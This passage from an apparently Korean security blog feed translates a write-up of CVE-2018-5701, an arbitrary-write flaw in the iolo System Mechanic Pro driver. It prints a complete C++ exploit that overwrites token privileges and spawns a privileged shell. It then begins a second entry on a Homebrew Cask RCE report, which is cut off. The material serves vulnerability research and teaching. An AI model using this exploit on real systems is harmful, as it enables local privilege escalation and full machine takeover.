class="hljs-number">0x2C</span>ui64);  <span class="hljs-keyword">if</span> ( *a1 != <span class="hljs-number">44</span>i64 )    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;  qmemcpy(a1, &amp;unk_FFFFF80068926BA8, <span class="hljs-number">0x2C</span>ui64);  <span class="hljs-keyword">return</span> v2;}</code></pre><p><code>sub_2C460</code> &#xC740; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xAC70;&#xC758; &#xC644;&#xBCBD;&#xD55C; <code>0xFFFFFFFE</code>&#xB97C; &#xBC18;&#xD658;&#xD55C;&#xB2E4;.</p><h1 id="Constraint-amp-Analysis-Recap"><a href="#Constraint-amp-Analysis-Recap" class="headerlink" title="Constraint&amp;Analysis Recap"></a>Constraint&amp;Analysis Recap</h1><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xBD84;&#xC11D;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><ul><li>&#xCDE8;&#xC57D;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xB294; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; &#xC720;&#xC800; &#xBC84;&#xD37C;&#xAC00; 3&#xAC1C;&#xC758; 8bytes &#xD544;&#xB4DC;&#xB85C; &#xAD6C;&#xC131;&#xB41C; 24bytes &#xD06C;&#xAE30;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xC774;&#xB2E4;.</li><li>&#xCCAB; &#xBC88;&#xC9F8; &#xD544;&#xB4DC;&#xB294; &#xD56D;&#xC0C1; 9&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xC815;&#xC218;&#xC774;&#xBA70; &#xD574;&#xB2F9; &#xAC12;&#xC5D0; &#xB530;&#xB77C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218; &#xC911; <code>sub_2C460</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; 8&#xC774;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;. (<code>sub_2C460</code> &#xCC38;&#xACE0;)</li><li>&#xB450; &#xBC88;&#xC9F8; &#xD544;&#xB4DC;&#xB294; &#xC5ED;&#xCC38;&#xC870; &#xB420; &#xB54C; 0&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; &#xB300;&#xD55C; &#xC720;&#xD6A8;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xC5EC;&#xC57C; &#xD55C;&#xB2E4;. (<code>sub_2C460</code> &#xCC38;&#xACE0;)</li></ul><p>&#xC138; &#xBC88;&#xC9F8; &#xD544;&#xB4DC;&#xC5D0;&#xB294; <code>sub_2C460</code>&#xC758; &#xBC18;&#xD658;&#xAC12;(<code>0xFFFFFFFE</code>)&#xC5D0; &#xC758;&#xD574; &#xAE30;&#xB85D;&#xB420; &#xC8FC;&#xC18C;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;.</p><h1 id="Abusing-Token-Privileges-for-LPE"><a href="#Abusing-Token-Privileges-for-LPE" class="headerlink" title="Abusing Token Privileges for LPE"></a>Abusing Token Privileges for LPE</h1><p>&#xC131;&#xACF5;&#xC801;&#xC778; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xC704;&#xD574; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><ol><li>SYSTEM&#xC758; &#xD1A0;&#xD070;&#xC744; &#xD0C8;&#xCDE8;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xB300;&#xCCB4;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;.</li><li>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD1A0;&#xD070; &#xAC12;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xB294; &#xCEE4;&#xB110; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; overwrite&#xD55C;&#xB2E4;.</li></ol><p>arbitrary write&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xBBC0;&#xB85C; &#xB450; &#xBC88;&#xC9F8; &#xACBD;&#xC6B0;&#xB97C; &#xACE0;&#xB824;&#xD574;&#xBCF8;&#xB2E4;. Windows&#xB294; &#xD1A0;&#xD070; &#xAC1D;&#xCCB4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD2B9;&#xC815; &#xC2A4;&#xB808;&#xB4DC;/&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xBCF4;&#xC548; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xAD00;&#xB9AC;&#xD55C;&#xB2E4;.(&#xD1A0;&#xD070; &#xAC1D;&#xCCB4;&#xB294; <code>nt!_TOKEN</code> &#xAD6C;&#xC870;&#xCCB4;&#xB85C; &#xD45C;&#xD604;&#xB428;) &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xAC01; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; object access negotiations &#xD639;&#xC740; &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xC791;&#xC5C5; &#xC911;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>EPROCESS</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xD1A0;&#xD070; &#xAC1D;&#xCCB4; &#xCC38;&#xC870;&#xAC00; &#xC788;&#xB2E4;. &#xC774;&#xC911; <code>_TOKEN*+ 0x40*</code>&#xC758; <code>_SEP_TOKEN_PRIVILEGES</code>&#xAC00; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xD544;&#xB4DC;&#xC774;&#xB2E4;.</p><pre><code class="hljs c">kd&gt; dt nt!_SEP_TOKEN_PRIVILEGES c5d39c30+<span class="hljs-number">40</span>   +<span class="hljs-number">0x000</span> Present          : <span class="hljs-number">0x00000006</span>`<span class="hljs-number">02880000</span>   +<span class="hljs-number">0x008</span> Enabled          : <span class="hljs-number">0x800000</span>  +<span class="hljs-number">0x010</span> EnabledByDefault : <span class="hljs-number">0x800000</span></code></pre><p><code>Present</code> : &#xD1A0;&#xD070;&#xC5D0; &#xB300;&#xD55C; &#xD604;&#xC7AC; &#xAD8C;&#xD55C;</p><p><code>Enable</code> : &#xD1A0;&#xD070;&#xC5D0; &#xB300;&#xD574; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xBAA8;&#xB4E0; &#xAD8C;&#xD55C;. <code>SeSinglePrivilegeCheck</code>&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB824;&#xBA74; &#xC774; &#xBE44;&#xD2B8; &#xB9C8;&#xC2A4;&#xD06C;&#xC5D0;&#xC11C; &#xAD8C;&#xD55C;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p><code>EnableByDefault</code> : &#xD1A0;&#xD070;&#xC758; &#xCD08;&#xAE30; &#xC0C1;&#xD0DC;</p><p><code>Present</code> &#xBC0F; <code>Enabled</code> &#xD56D;&#xBAA9;&#xC744; <code>0xFFFFFFFF</code> &#xAC12;&#xC73C;&#xB85C; overwrite &#xD558;&#xBA74; &#xBE44;&#xD2B8; &#xB9C8;&#xC2A4;&#xD06C;&#xC758; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xC640; &#xAD8C;&#xD55C;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>0xFFFFFFFE</code> &#xB97C; &#xC4F0;&#xB294; &#xAC83;&#xC774; &#xC6B0;&#xB9AC;&#xC5D0;&#xAC8C; &#xD544;&#xC694;&#xD55C; &#xC804;&#xBD80;&#xC774;&#xB2E4;.</p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>exploit&#xC740; &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB97C; &#xC218;&#xD589;&#xD55C;&#xB2E4;.</p><ol><li>&#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD1A0;&#xD070;&#xC744; &#xC5F0;&#xB2E4;. - &#xB098;&#xC911;&#xC5D0; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB97C; &#xCC3E;&#xC744; &#xB54C; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</li><li><code>NtQuerySystemInformation</code> API&#xB85C; &#xD578;&#xB4E4;&#xC774; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xAC1D;&#xCCB4;&#xC758; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB97C; leak &#xD55C;&#xB2E4;.</li><li>&#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xD1A0;&#xD070; &#xD578;&#xB4E4;&#xC744; &#xCC3E;&#xACE0; <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization#Microsoft_Windows">kASLR</a>&#xC744; &#xC6B0;&#xD68C;&#xD574; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC838;&#xC628;&#xB2E4;.</li><li><code>0xFFFFFFFE</code>&#xC744; &#xBC18;&#xD658;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB300;&#xD55C; IOCTL &#xC694;&#xCCAD; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; <code>Present</code> &#xD544;&#xB4DC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; &#xCD9C;&#xB825; &#xBC84;&#xD37C; &#xC8FC;&#xC18C;&#xB97C; &#xC124;&#xC815;&#xD55C;&#xB2E4;.</li><li>&#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; <code>Enabled</code> &#xBC0F; <code>EnabledByDefault</code> &#xD544;&#xB4DC;&#xB97C; <code>0xFFFFFFFE</code>&#xB85C; overwrite &#xD55C;&#xB2E4;. </li><li>&#xC704;&#xC5D0;&#xC11C; &#xBD80;&#xC5EC;&#xD55C; &#xD1A0;&#xD070; &#xAD8C;&#xD55C;&#xC744; &#xC0C1;&#xC18D;&#xD558;&#xB294; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;.</li></ol><p>&#xD56D;&#xC0C1; &#xADF8;&#xB7AC;&#xB4EF;&#xC774; &#xC8FC;&#xC11D;&#xC774; &#xB2EC;&#xB9B0; C++ exploit code&#xB294; &#xC5EC;&#xAE30; &#xB610;&#xB294; <a href="https://github.com/VoidSec/Exploit-Development/blob/master/windows/x64/kernel/iolo_System_Mechanic_Pro_v.15.5.0.61/iolo_System_Mechanic_Pro_v.15.5.0.61.cpp">Github</a> &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><span class="hljs-comment">Exploit title:      iolo System Mechanic Pro v. &lt;= 15.5.0.61 - Arbitrary Write Local Privilege Escalation (LPE)</span><span class="hljs-comment">Exploit Authors:    Federico Lagrasta aka last - https://blog.notso.pro/</span><span class="hljs-comment">                    Paolo Stagno aka VoidSec - voidsec@voidsec.com - https://voidsec.com</span><span class="hljs-comment">CVE:                CVE-2018-5701</span><span class="hljs-comment">Date:               28/03/2021</span><span class="hljs-comment">Vendor Homepage:    https://www.iolo.com/</span><span class="hljs-comment">Download:           https://www.iolo.com/products/system-mechanic-ultimate-defense/</span><span class="hljs-comment">                    https://mega.nz/file/xJgz0QYA#zy0ynELGQG8L_VAFKQeTOK3b6hp4dka7QWKWal9Lo6E</span><span class="hljs-comment">Version:            v.15.5.0.61</span><span class="hljs-comment">Tested on:          Windows 10 Pro x64 v.1903 Build 18362.30</span><span class="hljs-comment">Category:           local exploit</span><span class="hljs-comment">Platform:           windows</span><span class="hljs-comment">*/</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOCTL_CODE 0x226003 <span class="hljs-comment">// IOCTL_CODE value, used to reach the vulnerable function (taken from IDA)</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SystemHandleInformation 0x10</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SystemHandleInformationSize 1024 * 1024 * 2</span><span class="hljs-comment">// define the buffer structure which will be sent to the vulnerable driver</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Exploit</span></span><span class="hljs-class">{</span>    <span class="hljs-keyword">uint32_t</span> Field1_1;  <span class="hljs-comment">// must be 0x8 as this index will be used to calculate the address in a jump table and trigger the vulnerable function</span>    <span class="hljs-keyword">uint32_t</span> Field1_2;  <span class="hljs-comment">// &quot;padding&quot; can be anything</span>    <span class="hljs-keyword">int</span> *Field2;        <span class="hljs-comment">// must be a pointer that, once dereferenced, cotains 0</span>    <span class="hljs-keyword">void</span> *Field3;       <span class="hljs-comment">// points to the adrress that will be overwritten by 0xfffffffe - Arbitrary Write</span>};<span class="hljs-comment">// define a pointer to the native function &apos;NtQuerySystemInformation&apos;</span><span class="hljs-keyword">using</span> pNtQuerySystemInformation = NTSTATUS(WINAPI *)(    ULONG SystemInformationClass,    PVOID SystemInformation,    ULONG SystemInformationLength,    PULONG ReturnLength);<span class="hljs-comment">// define the SYSTEM_HANDLE_TABLE_ENTRY_INFO structure</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SYSTEM_HANDLE_TABLE_ENTRY_INFO</span></span><span class="hljs-class">{</span>    USHORT UniqueProcessId;    USHORT CreatorBackTraceIndex;    UCHAR ObjectTypeIndex;    UCHAR HandleAttributes;    USHORT HandleValue;    PVOID Object;    ULONG GrantedAccess;} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;<span class="hljs-comment">// define the SYSTEM_HANDLE_INFORMATION structure</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SYSTEM_HANDLE_INFORMATION</span></span><span class="hljs-class">{</span>    ULONG NumberOfHandles;    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[<span class="hljs-number">1</span>];} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><span class="hljs-function"></span>{    <span class="hljs-comment">// open a handle to the device exposed by the driver - symlink is \\.\amp</span>    HANDLE device = ::CreateFileW(        <span class="hljs-string">L&quot;\\\\.\\amp&quot;</span>,        GENERIC_WRITE | GENERIC_READ,        <span class="hljs-literal">NULL</span>,        <span class="hljs-literal">nullptr</span>,        OPEN_EXISTING,        <span class="hljs-literal">NULL</span>,        <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (device == INVALID_HANDLE_VALUE)    {        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&apos;t open handle to the System Mechanic driver. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Opened a handle to the System Mechanic driver!\n&quot;</span>;    <span class="hljs-comment">// resolve the address of NtQuerySystemInformation and assign it to a function pointer</span>    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)::GetProcAddress(::LoadLibraryW(<span class="hljs-string">L&quot;ntdll&quot;</span>), <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);    <span class="hljs-keyword">if</span> (!NtQuerySystemInformation)    {        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&apos;t resolve NtQuerySystemInformation API. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Resolved NtQuerySystemInformation!\n&quot;</span>;    <span class="hljs-comment">// open the current process token - it will be used to retrieve its kernelspace address later</span>    HANDLE currentProcess = ::GetCurrentProcess();    HANDLE currentToken = <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">bool</span> success = ::OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &amp;currentToken);    <span class="hljs-keyword">if</span> (!success)    {        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&apos;t open handle to the current process token. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Opened a handle to the current process token!\n&quot;</span>;    <span class="hljs-comment">// allocate space in the heap for the handle table information which will be filled by the call to &apos;NtQuerySystemInformation&apos; API</span>    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(::GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);    <span class="hljs-comment">// call NtQuerySystemInformation and fill the handleTableInformation structure</span>    ULONG returnLength = <span class="hljs-number">0</span>;    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &amp;returnLength);    <span class="hljs-keyword">uint64_t</span> tokenAddress = <span class="hljs-number">0</span>;    <span class="hljs-comment">// iterate over the system&apos;s handle table and look for the handles beloging to our process</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; handleTableInformation-&gt;NumberOfHandles; i++)    {        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation-&gt;Handles[i];        <span class="hljs-comment">// if it finds our process and the handle matches the current token handle we already opened, print it</span>        <span class="hljs-keyword">if</span> (handleInfo.UniqueProcessId == ::GetCurrentProcessId() &amp;&amp; handleInfo.HandleValue == (USHORT)currentToken)        {            tokenAddress = (<span class="hljs-keyword">uint64_t</span>)handleInfo.Object;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Current token address in kernelspace is: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; tokenAddress &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        }    }    <span class="hljs-comment">// allocate a variable set to 0</span>    <span class="hljs-keyword">int</span> field2 = <span class="hljs-number">0</span>;    <span class="hljs-comment">/*</span><span class="hljs-comment">    dt nt!_SEP_TOKEN_PRIVILEGES</span><span class="hljs-comment">       +0x000 Present          : Uint8B</span><span class="hljs-comment">       +0x008 Enabled          : Uint8B</span><span class="hljs-comment">       +0x010 EnabledByDefault : Uint8B</span><span class="hljs-comment"></span><span class="hljs-comment">    We&apos;ve added +1 to the offsets to ensure that the low bytes part are 0xff.</span><span class="hljs-comment">    */</span>    <span class="hljs-comment">// overwrite the _SEP_TOKEN_PRIVILEGES  &quot;Present&quot; field in the current process token</span>    Exploit exploit =        {            <span class="hljs-number">8</span>,            <span class="hljs-number">0</span>,            &amp;field2,            (<span class="hljs-keyword">void</span> *)(tokenAddress + <span class="hljs-number">0x41</span>)};    <span class="hljs-comment">// overwrite the _SEP_TOKEN_PRIVILEGES  &quot;Enabled&quot; field in the current process token</span>    Exploit exploit2 =        {            <span class="hljs-number">8</span>,            <span class="hljs-number">0</span>,            &amp;field2,            (<span class="hljs-keyword">void</span> *)(tokenAddress + <span class="hljs-number">0x49</span>)};    <span class="hljs-comment">// overwrite the _SEP_TOKEN_PRIVILEGES  &quot;EnabledByDefault&quot; field in the current process token</span>    Exploit exploit3 =        {            <span class="hljs-number">8</span>,            <span class="hljs-number">0</span>,            &amp;field2,            (<span class="hljs-keyword">void</span> *)(tokenAddress + <span class="hljs-number">0x51</span>)};    DWORD bytesReturned = <span class="hljs-number">0</span>;    success = DeviceIoControl(        device,        IOCTL_CODE,        &amp;exploit,        <span class="hljs-keyword">sizeof</span>(exploit),        <span class="hljs-literal">nullptr</span>,        <span class="hljs-number">0</span>,        &amp;bytesReturned,        <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">if</span> (!success)    {        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&apos;t overwrite current token &apos;Present&apos; field. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Successfully overwritten current token &apos;Present&apos; field!\n&quot;</span>;    success = DeviceIoControl(        device,        IOCTL_CODE,        &amp;exploit2,        <span class="hljs-keyword">sizeof</span>(exploit2),        <span class="hljs-literal">nullptr</span>,        <span class="hljs-number">0</span>,        &amp;bytesReturned,        <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">if</span> (!success)    {        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&apos;t overwrite current token &apos;Enabled&apos; field. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Successfully overwritten current token &apos;Enabled&apos; field!\n&quot;</span>;    success = DeviceIoControl(        device,        IOCTL_CODE,        &amp;exploit3,        <span class="hljs-keyword">sizeof</span>(exploit3),        <span class="hljs-literal">nullptr</span>,        <span class="hljs-number">0</span>,        &amp;bytesReturned,        <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">if</span> (!success)    {        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&apos;t overwrite current token &apos;EnabledByDefault&apos; field. Error code:&quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Successfully overwritten current token &apos;EnabledByDefault&apos; field!\n&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Token privileges successfully overwritten!\n&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Spawning a new shell with full privileges!\n&quot;</span>;    system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}<span class="hljs-comment">/*</span><span class="hljs-comment">    |\__/,|   (`\</span><span class="hljs-comment">  _.|o o  |_   ) )</span><span class="hljs-comment">-(((---(((--------</span><span class="hljs-comment">*/</span></code></pre><h1 id="Video-PoC"><a href="#Video-PoC" class="headerlink" title="Video PoC"></a>Video PoC</h1><p><a href="https://www.youtube.com/watch?v=IIARwtJEhxs&amp;feature=emb_title">https://www.youtube.com/watch?v=IIARwtJEhxs&amp;feature=emb_title</a></p><h1 id="Upcoming-Article"><a href="#Upcoming-Article" class="headerlink" title="Upcoming Article"></a>Upcoming Article</h1><p>&#xC77C;&#xBD80; &#xACF5;&#xAE09; &#xC5C5;&#xCCB4;&#xC758; &#xC81C;&#xC57D;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC57D;&#xAC04; &#xC5F0;&#xAE30;&#xD574;&#xC57C; &#xD588;&#xC73C;&#xBA70; &#xB2E4;&#xC74C; &#xBE14;&#xB85C;&#xADF8; &#xAC8C;&#xC2DC;&#xBB3C;&#xC5D0;&#xC11C;&#xB294; &#xC778;&#xAE30;&#xC788;&#xB294; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xD30C;&#xC77C; &#xC4F0;&#xAE30;&#xC5D0;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; (EoP)&#xC73C;&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB3C4;&#xB85D; &#xD55C; &#xC77C;&#xB828;&#xC758; &#xBC84;&#xADF8;&#xB97C; &#xACF5;&#xAC1C; &#xD560; &#xC608;&#xC815;&#xC774;&#xB2E4;.</p><h1 id="Resources-amp-References"><a href="#Resources-amp-References" class="headerlink" title="Resources &amp; References"></a>Resources &amp; References</h1><ul><li><a href="https://www.youtube.com/watch?v=qk-OI8Z-1To">Driver Attack Surface</a></li><li><a href="https://github.com/Microsoft/Windows-Driver-Frameworks">Windows DriverFrameworks</a></li><li><a href="https://www.exploit-db.com/exploits/42556">Abusing Token Privileges for LPE</a></li><li><a href="https://twitter.com/HackSysTeam">@HackSysTeam</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>ioctl</tag>
      
      <tag>driver</tag>
      
      <tag>L0ch</tag>
      
      <tag>exploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Homebrew package manager의 RCE 취약점</title>
    <link href="/2021/04/27/l0ch/2021-04-27/"/>
    <url>/2021/04/27/l0ch/2021-04-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1167608">Broken parsing of Git diff allows an attacker to inject arbitrary Ruby scripts to Casks on official taps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Homebrew</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MacOs, Linux&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xCEE4;&#xB9E8;&#xB4DC; &#xB77C;&#xC778; &#xD328;&#xD0A4;&#xC9C0; &#xB9E4;&#xB2C8;&#xC800;&#xC778; Homebrew&#xC758; Homebrew Cask&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Homebrew Cask&#xB294; &#xCEE4;&#xB9E8;&#xB4DC; &#xB77C;&#xC778;&#xC5D0;&#xC11C; GUI &#xAE30;&#xBC18; &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; Homebrew-cask&#xC758; github &#xC800;&#xC7A5;&#xC18C; &#xAD00;&#xB9AC;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. Homebrew-cask&#xC5D0;&#xB294; <code>Review-cask-pr</code> github action&#xC774; 